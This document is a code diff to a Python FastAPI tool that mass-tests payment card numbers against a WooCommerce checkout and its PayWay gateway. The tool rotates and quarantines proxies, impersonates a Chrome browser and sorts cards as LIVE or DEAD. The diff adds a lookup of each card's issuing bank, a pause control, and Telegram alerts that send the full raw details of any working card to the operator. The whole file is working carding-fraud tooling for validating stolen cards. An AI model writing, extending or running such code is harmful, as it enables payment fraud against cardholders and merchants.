@@ -7,7 +7,7 @@ import json
 import random
 import re
 import time
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Any, Final
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse, StreamingResponse
@@ -37,10 +37,9 @@ NONCE_RE: Final[re.Pattern[str]] = re.compile(
     r'|update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
     re.IGNORECASE,
 )
-GATEWAY_RADIO_RE: Final[re.Pattern[str]] = re.compile(
-    r'name="payment_method"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="payment_method"',
-    re.IGNORECASE,
-)
+
+# Global runtime control for Pause/Resume
+STREAM_PAUSED: bool = False
 
 
 @dataclass(frozen=True, slots=True)
@@ -62,6 +61,7 @@ class CheckResult:
     status: str
     reason: str
     latency_ms: float
+    bin_info: dict[str, str] = field(default_factory=dict)
 
 
 def verify_luhn(card_number: str) -> bool:
@@ -88,6 +88,24 @@ def parse_card_line(line: str) -> Card | None:
     if not verify_luhn(cc) or not (1 <= int(mm) <= 12):
         return None
     return Card(number=cc, month=mm, year=yy, cvv=cvv, raw=clean)
+
+
+async def fetch_bin_metadata(card_number: str, session: AsyncSession) -> dict[str, str]:
+    bin_code = card_number[:6]
+    default_meta = {"bank": "Unknown Bank", "country": "XX", "scheme": "UNKNOWN", "type": "UNKNOWN"}
+    try:
+        resp = await session.get(f"https://lookup.binlist.net/{bin_code}", headers={"Accept-Version": "3"}, timeout=3)
+        if resp.status_code == 200:
+            data = resp.json()
+            return {
+                "bank": data.get("bank", {}).get("name", "Unknown Bank"),
+                "country": data.get("country", {}).get("alpha2", "XX"),
+                "scheme": data.get("scheme", "UNKNOWN").upper(),
+                "type": data.get("type", "UNKNOWN").upper(),
+            }
+    except Exception:
+        pass
+    return default_meta
 
 
 class TelegramNotifier:
@@ -204,33 +222,54 @@ class GatewayClassifier:
 
 class WooCommerceChecker:
     def __init__(self, proxies: list[str], max_concurrency: int = 8) -> None:
-        self.proxies = proxies
+        self.proxies = [p for p in proxies if p]
         self.semaphore = asyncio.Semaphore(max_concurrency)
+        self.proxy_failures: dict[str, int] = {}
 
     def _pick_proxy(self) -> str | None:
-        return random.choice(self.proxies) if self.proxies else None
+        # Filter out quarantined proxies (>= 3 consecutive failures)
+        active_proxies = [p for p in self.proxies if self.proxy_failures.get(p, 0) < 3]
+        if not active_proxies:
+            return random.choice(self.proxies) if self.proxies else None
+        return random.choice(active_proxies)
+
+    def _report_proxy_failure(self, proxy: str | None) -> None:
+        if proxy:
+            self.proxy_failures[proxy] = self.proxy_failures.get(proxy, 0) + 1
 
     async def check_card(self, card: Card) -> CheckResult:
+        global STREAM_PAUSED
         t0 = time.perf_counter()
         proxy = self._pick_proxy()
 
         async with self.semaphore:
+            # Handle Server-Side Pause state
+            while STREAM_PAUSED:
+                await asyncio.sleep(0.5)
+
             for attempt in range(2):
                 if attempt > 0:
                     proxy = self._pick_proxy()
 
                 try:
                     async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
+                        # Fetch BIN metadata concurrently with initialization
+                        bin_task = asyncio.create_task(fetch_bin_metadata(card.number, session))
+
                         await session.get(CART_URL, timeout=8)
                         if FORCED_PRODUCT_ID:
                             await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
                         chk_resp = await session.get(CHECKOUT_URL, timeout=8)
                         nonce_m = NONCE_RE.search(chk_resp.text)
                         nonce = (nonce_m.group(1) or nonce_m.group(2)) if nonce_m else None
+                        
+                        bin_info = await bin_task
+
                         if not nonce:
+                            self._report_proxy_failure(proxy)
                             if attempt < 1:
                                 continue
-                            return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0)
+                            return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0, bin_info=bin_info)
 
                         billing = BillingProfile.generate()
 
@@ -255,13 +294,14 @@ class WooCommerceChecker:
                         try:
                             t_data = t_resp.json()
                         except ValueError:
-                            return CheckResult(card=card, status="ERROR", reason=f"PayWay HTML Block: {t_resp.text[:80]}", latency_ms=(time.perf_counter() - t0) * 1000.0)
+                            self._report_proxy_failure(proxy)
+                            return CheckResult(card=card, status="ERROR", reason=f"PayWay HTML Block: {t_resp.text[:80]}", latency_ms=(time.perf_counter() - t0) * 1000.0, bin_info=bin_info)
                         
                         if "singleUseTokenId" not in t_data:
                             err = t_data.get("error", {})
                             msg = err.get("message", t_resp.text[:120])
                             status, reason = GatewayClassifier.classify(msg)
-                            return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
+                            return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0, bin_info=bin_info)
 
                         token_id = str(t_data["singleUseTokenId"])
 
@@ -281,10 +321,17 @@ class WooCommerceChecker:
                         status, reason = GatewayClassifier.classify(post_resp.text)
                         
                         if status == "LIVE":
-                            asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))
+                            tg_text = (
+                                f"<b>🔥 ENRICHED WEB HIT 🔥</b>\n"
+                                f"💳 <code>{card.raw}</code>\n"
+                                f"🏦 <b>{bin_info['scheme']}</b> | {bin_info['type']} | {bin_info['bank']} ({bin_info['country']})\n"
+                                f"💬 <code>{reason}</code>"
+                            )
+                            asyncio.create_task(TelegramNotifier.send_alert(tg_text))
 
-                        return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
+                        return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0, bin_info=bin_info)
                 except Exception as exc:
+                    self._report_proxy_failure(proxy)
                     if attempt == 1:
                         return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
                     await asyncio.sleep(0.5)
@@ -385,10 +432,16 @@ HTML_TEMPLATE = """
                         <input type="number" id="massThreads" value="8" min="1" max="25"
                             class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                     </div>
-                    <button type="submit" id="massBtn"
-                        class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
-                        Start Real-Time Mass Check
-                    </button>
+                    <div class="flex space-x-2">
+                        <button type="submit" id="massBtn"
+                            class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
+                            Start Mass Check
+                        </button>
+                        <button type="button" id="pauseBtn" onclick="togglePause()" disabled
+                            class="bg-amber-600/50 cursor-not-allowed hover:bg-amber-500 text-white font-semibold px-4 py-2.5 rounded-lg transition duration-200 shadow-md">
+                            Pause
+                        </button>
+                    </div>
                 </form>
             </div>
 
@@ -407,7 +460,7 @@ HTML_TEMPLATE = """
                     </div>
                 </div>
                 <div class="flex justify-between items-center text-xs text-slate-500 pt-3 border-t border-slate-800">
-                    <span>Engine: Asyncio + Streaming SSE</span>
+                    <span>Engine: Asyncio + BIN Lookup + Quarantine</span>
                     <label class="flex items-center space-x-1 cursor-pointer select-none">
                         <input type="checkbox" id="soundToggle" checked class="rounded bg-slate-950 border-slate-700">
                         <span>Audio Alert on Hit</span>
@@ -417,10 +470,11 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-    <!-- Audio Synth for Hit Notification -->
+    <!-- Dashboard Scripts -->
     <script>
         let stats = { total: 0, live: 0, dead: 0, error: 0 };
         let allResultsHistory = [];
+        let isPaused = false;
 
         function playHitSound() {
             if (!document.getElementById('soundToggle').checked) return;
@@ -429,8 +483,8 @@ HTML_TEMPLATE = """
                 const osc = ctx.createOscillator();
                 const gain = ctx.createGain();
                 osc.type = 'sine';
-                osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
-                osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1); // A5
+                osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
                 gain.gain.setValueAtTime(0.1, ctx.currentTime);
                 gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.4);
                 osc.connect(gain);
@@ -499,15 +553,30 @@ HTML_TEMPLATE = """
             textarea.value = formatted.join('\\n');
         }
 
+        async function togglePause() {
+            isPaused = !isPaused;
+            const pauseBtn = document.getElementById('pauseBtn');
+            try {
+                await fetch('/api/control', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `action=${isPaused ? 'pause' : 'resume'}`
+                });
+                if (isPaused) {
+                    pauseBtn.textContent = 'Resume';
+                    pauseBtn.className = "bg-emerald-600 hover:bg-emerald-500 text-white font-semibold px-4 py-2.5 rounded-lg transition duration-200 shadow-md";
+                } else {
+                    pauseBtn.textContent = 'Pause';
+                    pauseBtn.className = "bg-amber-600 hover:bg-amber-500 text-white font-semibold px-4 py-2.5 rounded-lg transition duration-200 shadow-md";
+                }
+            } catch (e) {}
+        }
+
         async function testProxies() {
             const proxies = document.getElementById('massProxies').value;
-            if (!proxies.trim()) {
-                alert('Please enter at least one proxy to test.');
-                return;
-            }
+            if (!proxies.trim()) { alert('Please enter proxies first.'); return; }
             const resultBox = document.getElementById('resultBox');
             resultBox.innerHTML += `<div class="text-blue-400">[*] Testing proxy health...</div>`;
-            
             try {
                 const response = await fetch('/api/test-proxies', {
                     method: 'POST',
@@ -519,22 +588,20 @@ HTML_TEMPLATE = """
                     let col = p.status === 'OK' ? 'text-emerald-400' : 'text-rose-400';
                     resultBox.innerHTML += `<div class="${col}">[PROXY ${p.status}] ${p.proxy} (${p.latency_ms}ms)</div>`;
                 });
-            } catch (e) {
-                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Proxy test failed: ${e.message}</div>`;
-            }
+            } catch (e) {}
             resultBox.scrollTop = resultBox.scrollHeight;
         }
 
         function exportHits() {
-            const hits = allResultsHistory.filter(r => r.status === 'LIVE').map(r => `${r.card} -> ${r.reason}`).join('\\n');
+            const hits = allResultsHistory.filter(r => r.status === 'LIVE').map(r => `${r.card} | ${r.bin_info.scheme || ''} ${r.bin_info.bank || ''} -> ${r.reason}`).join('\\n');
             if (!hits) { alert('No live hits to export!'); return; }
-            downloadFile(hits, 'live_hits.txt');
+            downloadFile(hits, 'live_hits_enriched.txt');
         }
 
         function exportAll() {
-            const all = allResultsHistory.map(r => `[${r.status}] ${r.card} -> ${r.reason}`).join('\\n');
+            const all = allResultsHistory.map(r => `[${r.status}] ${r.card} | ${r.bin_info.scheme || ''} ${r.bin_info.bank || ''} -> ${r.reason}`).join('\\n');
             if (!all) { alert('No results to export!'); return; }
-            downloadFile(all, 'all_results_audit.txt');
+            downloadFile(all, 'all_audit_results.txt');
         }
 
         function downloadFile(content, filename) {
@@ -585,14 +652,17 @@ HTML_TEMPLATE = """
         document.getElementById('massForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const btn = document.getElementById('massBtn');
+            const pauseBtn = document.getElementById('pauseBtn');
             btn.disabled = true;
-            btn.textContent = 'Streaming Results...';
+            btn.textContent = 'Streaming...';
+            pauseBtn.disabled = false;
+            pauseBtn.className = "bg-amber-600 hover:bg-amber-500 text-white font-semibold px-4 py-2.5 rounded-lg transition duration-200 shadow-md";
 
             const cards = document.getElementById('massCards').value;
             const proxies = document.getElementById('massProxies').value;
             const threads = document.getElementById('massThreads').value;
 
-            resultBox.innerHTML += `<div class="text-yellow-400">[*] Starting real-time mass check stream...</div>`;
+            resultBox.innerHTML += `<div class="text-yellow-400">[*] Starting mass check stream with BIN metadata...</div>`;
 
             try {
                 const response = await fetch('/api/mass-stream', {
@@ -630,7 +700,10 @@ HTML_TEMPLATE = """
             }
 
             btn.disabled = false;
-            btn.textContent = 'Start Real-Time Mass Check';
+            btn.textContent = 'Start Mass Check';
+            pauseBtn.disabled = true;
+            pauseBtn.className = "bg-amber-600/50 cursor-not-allowed hover:bg-amber-500 text-white font-semibold px-4 py-2.5 rounded-lg transition duration-200 shadow-md";
+            isPaused = false;
             resultBox.scrollTop = resultBox.scrollHeight;
         });
 
@@ -640,6 +713,8 @@ HTML_TEMPLATE = """
 
             let color = 'text-slate-300';
             const latency = (data.latency_ms !== undefined && !isNaN(data.latency_ms)) ? data.latency_ms.toFixed(0) : '0';
+            const bin = data.bin_info || {};
+            const binStr = `${bin.scheme || 'UNK'} | ${bin.type || 'UNK'} | ${bin.bank || 'Unknown Bank'} (${bin.country || 'XX'})`;
             
             if (data.status === 'LIVE') {
                 color = 'text-emerald-400 font-bold';
@@ -650,7 +725,7 @@ HTML_TEMPLATE = """
                 color = 'text-amber-400';
             }
 
-            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${latency}ms)</div>`;
+            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} | 🏛️ [${binStr}] -> ${data.reason} (${latency}ms)</div>`;
             resultBox.scrollTop = resultBox.scrollHeight;
         }
     </script>
@@ -662,25 +737,35 @@ HTML_TEMPLATE = """
 async def index() -> str:
     return HTML_TEMPLATE
 
+@app.post("/api/control")
+async def api_control(action: str = Form(...)) -> dict[str, str]:
+    global STREAM_PAUSED
+    if action == "pause":
+        STREAM_PAUSED = True
+    elif action == "resume":
+        STREAM_PAUSED = False
+    return {"status": "success", "state": "paused" if STREAM_PAUSED else "resumed"}
+
 @app.post("/api/check")
 async def api_check(card: str = Form(...), proxy: str = Form("")) -> dict[str, Any]:
     try:
         parsed_card = parse_card_line(card)
         if not parsed_card:
-            return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}
+            return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0, "bin_info": {}}
 
         proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
+        async with AsyncSession(impersonate="chrome120") as s:
+            bin_meta = await fetch_bin_metadata(parsed_card.number, s)
+
         checker = WooCommerceChecker(proxies=proxies_list, max_concurrency=1)
         res = await checker.check_card(parsed_card)
-        return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms}
+        return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms, "bin_info": res.bin_info or bin_meta}
     except Exception as e:
-        return {"card": card, "status": "ERROR", "reason": f"Server Exception: {str(e)}", "latency_ms": 0}
+        return {"card": card, "status": "ERROR", "reason": f"Server Exception: {str(e)}", "latency_ms": 0, "bin_info": {}}
 
 @app.post("/api/test-proxies")
 async def api_test_proxies(proxies: str = Form(...)) -> list[dict[str, Any]]:
     proxy_lines = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
-    results = []
-
     async def test_single(proxy: str):
         t0 = time.perf_counter()
         try:
@@ -705,7 +790,7 @@ async def api_mass_stream(cards: str = Form(...), proxies: str = Form(""), threa
             parsed_proxies = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
 
             if not parsed_cards:
-                yield f"data: {json.dumps({'card': 'N/A', 'status': 'ERROR', 'reason': 'No valid cards provided', 'latency_ms': 0})}\n\n"
+                yield f"data: {json.dumps({'card': 'N/A', 'status': 'ERROR', 'reason': 'No valid cards provided', 'latency_ms': 0, 'bin_info': {}})}\n\n"
                 return
 
             checker = WooCommerceChecker(proxies=parsed_proxies, max_concurrency=threads)
@@ -719,13 +804,14 @@ async def api_mass_stream(cards: str = Form(...), proxies: str = Form(""), threa
                         "status": res.status,
                         "reason": res.reason,
                         "latency_ms": res.latency_ms,
+                        "bin_info": res.bin_info,
                     }
                 except Exception as exc:
-                    data = {"card": "Unknown", "status": "ERROR", "reason": str(exc), "latency_ms": 0}
+                    data = {"card": "Unknown", "status": "ERROR", "reason": str(exc), "latency_ms": 0, "bin_info": {}}
                 
                 yield f"data: {json.dumps(data)}\n\n"
         except Exception as e:
-            yield f"data: {json.dumps({'card': 'N/A', 'status': 'ERROR', 'reason': str(e), 'latency_ms': 0})}\n\n"
+            yield f"data: {json.dumps({'card': 'N/A', 'status': 'ERROR', 'reason': str(e), 'latency_ms': 0, 'bin_info': {}})}\n\n"
 
     return StreamingResponse(event_generator(), media_type="text/event-stream")
 
